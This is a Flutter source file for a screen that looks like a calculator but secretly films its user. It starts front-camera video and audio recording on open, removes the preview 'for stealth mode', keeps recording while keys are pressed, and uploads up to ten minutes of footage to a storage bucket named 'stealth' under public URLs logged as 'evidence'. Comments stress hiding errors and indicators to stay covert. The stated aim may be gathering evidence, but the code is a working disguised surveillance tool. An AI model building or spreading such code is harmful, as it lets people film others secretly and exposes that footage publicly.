import 'dart:io';
import 'dart:async';
import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
// ignore: depend_on_referenced_packages
import 'package:path/path.dart' as path;
import 'package:permission_handler/permission_handler.dart';
import 'package:supabase_flutter/supabase_flutter.dart';

class CalculatorScreen extends StatefulWidget {
  const CalculatorScreen({super.key});

  @override
  // ignore: library_private_types_in_public_api
  _CalculatorScreenState createState() => _CalculatorScreenState();
}

class _CalculatorScreenState extends State<CalculatorScreen> {
  String displayText = '';
  CameraController? _cameraController;
  bool isRecording = false;
  bool isCameraInitialized = false;
  bool hasUploaded = false;
  bool _isRecordingActive = false;
  Timer? _recordingTimer;

  final supabase = Supabase.instance.client;

  // Configurable recording duration (in minutes)
  // ignore: constant_identifier_names
  static const int RECORDING_DURATION_MINUTES = 10; // Increased to 10 minutes

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    if (!await _requestPermissions()) return;
    await _initCamera();
  }

  Future<bool> _requestPermissions() async {
    final statuses = await [
      Permission.camera,
      Permission.microphone,
      Permission.storage,
    ].request();

    final allGranted = statuses.values.every((status) => status.isGranted);

    if (!allGranted) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('❌ Permissions not granted')),
        );
      }
    }

    return allGranted;
  }

  Future<void> _initCamera() async {
    try {
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        print('❌ No cameras available');
        return;
      }

      final frontCamera = cameras.firstWhere(
        (camera) => camera.lensDirection == CameraLensDirection.front,
        orElse: () => cameras.first,
      );

      _cameraController = CameraController(
        frontCamera,
        ResolutionPreset.medium,
        enableAudio: true,
      );

      await _cameraController!.initialize();
      
      if (!mounted) return;
      
      setState(() => isCameraInitialized = true);

      // Wait longer before starting recording to ensure camera is fully stable
      await Future.delayed(Duration(seconds: 3));
      
      if (mounted && _cameraController != null && !_isRecordingActive) {
        await _startRecording();
      }
    } catch (e) {
      print('❌ Camera init error: $e');
    }
  }

  Future<void> _startRecording() async {
    if (_cameraController == null || _isRecordingActive) {
      print('⚠️ Camera controller is null or already recording');
      return;
    }

    if (!_cameraController!.value.isInitialized) {
      print('⚠️ Camera not initialized');
      return;
    }

    if (_cameraController!.value.isRecordingVideo) {
      print('⚠️ Already recording');
      return;
    }

    if (!mounted) {
      print('⚠️ Widget not mounted');
      return;
    }

    try {
      await _cameraController!.startVideoRecording();
      if (mounted) {
        setState(() {
          isRecording = true;
          _isRecordingActive = true;
        });
      }
      print('🎥 Recording started successfully');
      
      // Set a timer to automatically stop recording after the configured duration
      _recordingTimer = Timer(Duration(minutes: RECORDING_DURATION_MINUTES), () {
        if (_isRecordingActive && !hasUploaded && mounted) {
          print('⏰ Auto-stopping recording after $RECORDING_DURATION_MINUTES minutes');
          _stopRecording();
        }
      });
      
    } catch (e, stack) {
      print('❌ Recording error: $e\n$stack');
    }
  }

  Future<void> _stopRecording() async {
    if (_cameraController == null || !_isRecordingActive) {
      print('⚠️ No active recording to stop');
      return;
    }

    if (!_cameraController!.value.isRecordingVideo) {
      print('⚠️ Not currently recording');
      return;
    }

    if (hasUploaded) {
      print('⚠️ Already uploaded, skipping');
      return;
    }

    // Cancel the recording timer if it's still active
    _recordingTimer?.cancel();
    _recordingTimer = null;

    try {
      final XFile recorded = await _cameraController!.stopVideoRecording();
      setState(() {
        isRecording = false;
        _isRecordingActive = false;
      });
      print('📁 Recording stopped: ${recorded.path}');

      // Check if file actually has content
      final file = File(recorded.path);
      final fileSize = await file.length();
      print('📏 File size: $fileSize bytes');

      if (fileSize > 0) {
        final uploadedUrl = await _uploadToSupabaseStorage(recorded.path);
        if (uploadedUrl != null) {
          await _logEvidenceToDatabase(uploadedUrl);
          setState(() => hasUploaded = true);
        }
      } else {
        print('⚠️ Recording file is empty');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text('⚠️ Recording failed - file is empty')),
          );
        }
      }
    } catch (e) {
      print('❌ Stop/Upload error: $e');
      setState(() {
        isRecording = false;
        _isRecordingActive = false;
      });
    }
  }

  Future<String?> _uploadToSupabaseStorage(String filePath) async {
    final file = File(filePath);
    final fileName = '${DateTime.now().millisecondsSinceEpoch}_${path.basename(filePath)}';
    final bytes = await file.readAsBytes();
    final bucket = 'stealth';

    try {
      final String uploadedPath = await supabase.storage.from(bucket).uploadBinary(
        'videos/$fileName',
        bytes,
        fileOptions: FileOptions(
          cacheControl: '3600',
          upsert: true,
          contentType: 'video/mp4',
        ),
      );

      // Get the public URL for the uploaded file
      final String publicUrl = supabase.storage.from(bucket).getPublicUrl('videos/$fileName');

      print('✅ Uploaded: $uploadedPath');
      print('🔗 Public URL: $publicUrl');
      
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('✅ Video uploaded successfully')),
        );
      }
      
      return publicUrl;
    } catch (e) {
      print('❌ Upload error: $e');
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('❌ Upload failed')),
        );
      }
      return null;
    }
  }

  Future<void> _logEvidenceToDatabase(String evidenceUrl) async {
    try {
      final user = supabase.auth.currentUser;
      
      if (user == null) {
        print('⚠️ No authenticated user found');
        return;
      }

      final response = await supabase.from('stealth').insert({
        'userid': user.id,
        'evidence_url': evidenceUrl,
        'created_at': DateTime.now().toIso8601String(),
      });

      print('✅ Evidence logged to database');
      print('👤 User ID: ${user.id}');
      print('🔗 Evidence URL: $evidenceUrl');
      
    } catch (e) {
      print('❌ Database logging error: $e');
      // Don't show user error for database logging to maintain stealth
    }
  }

  void onPressed(String value) {
    setState(() {
      displayText += value;
    });
  }

  void clear() async {
    // Don't stop recording on clear - keep it stealth
    setState(() => displayText = '');
  }

  void backspace() async {
    // Don't stop recording on backspace - keep it stealth
    setState(() {
      displayText = displayText.isNotEmpty
          ? displayText.substring(0, displayText.length - 1)
          : '';
    });
  }

  @override
  void dispose() {
    // Cancel any active timers
    _recordingTimer?.cancel();
    // Don't await async operations in dispose - handle them synchronously
    _handleDispose();
    super.dispose();
  }

  void _handleDispose() {
    // Handle cleanup without blocking dispose
    if (_isRecordingActive && !hasUploaded && _cameraController != null) {
      // Stop recording in background without awaiting
      _stopRecording().then((_) {
        _cameraController?.dispose();
      }).catchError((e) {
        print('❌ Error during dispose: $e');
        _cameraController?.dispose();
      });
    } else {
      _cameraController?.dispose();
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        // Stop recording when leaving the screen
        if (_isRecordingActive && !hasUploaded) {
          print('🔙 Stopping recording due to navigation');
          await _stopRecording();
          // Give a moment for the recording to stop properly
          await Future.delayed(Duration(milliseconds: 500));
        }
        return true;
      },
      child: Scaffold(
        appBar: AppBar(
          title: Text("Calculator"),
          backgroundColor: Colors.black,
          leading: IconButton(
            icon: Icon(Icons.arrow_back),
            onPressed: () async {
              // Ensure recording stops when back button is pressed
              if (_isRecordingActive && !hasUploaded) {
                await _stopRecording();
              }
              Navigator.of(context).pop();
            },
          ),
        ),
        backgroundColor: Colors.black,
        body: Column(
          children: [
            // Removed camera preview for stealth mode
            // Camera is initialized and recording but not visible
            Expanded(
              child: Container(
                alignment: Alignment.bottomRight,
                padding: EdgeInsets.all(24),
                child: Text(
                  displayText,
                  style: TextStyle(color: Colors.white, fontSize: 36),
                ),
              ),
            ),
            GridView.count(
              crossAxisCount: 4,
              shrinkWrap: true,
              physics: NeverScrollableScrollPhysics(),
              children: [
                ...['7', '8', '9', 'C', '4', '5', '6', '←', '1', '2', '3', '+', '0', '.', '=', '-']
                    .map((e) => buildButton(e)),
              ],
            ),
            // Optional: Add a subtle indicator for recording status (remove if too obvious)
            if (isRecording)
              Container(
                height: 2,
                color: Colors.red.withOpacity(0.3),
              ),
          ],
        ),
      ),
    );
  }

  Widget buildButton(String text) {
    return GestureDetector(
      onTap: () {
        if (text == 'C') {
          clear();
        } else if (text == '←') {
          backspace();
        } else {
          onPressed(text);
        }
      },
      child: Container(
        margin: EdgeInsets.all(6),
        decoration: BoxDecoration(
          color: Colors.grey[850],
          borderRadius: BorderRadius.circular(16),
          boxShadow: [
            BoxShadow(
              color: Colors.black54,
              offset: Offset(2, 2),
              blurRadius: 4,
            ),
          ],
        ),
        child: Center(
          child: Text(
            text,
            style: TextStyle(fontSize: 28, color: Colors.white),
          ),
        ),
      ),
    );
  }
}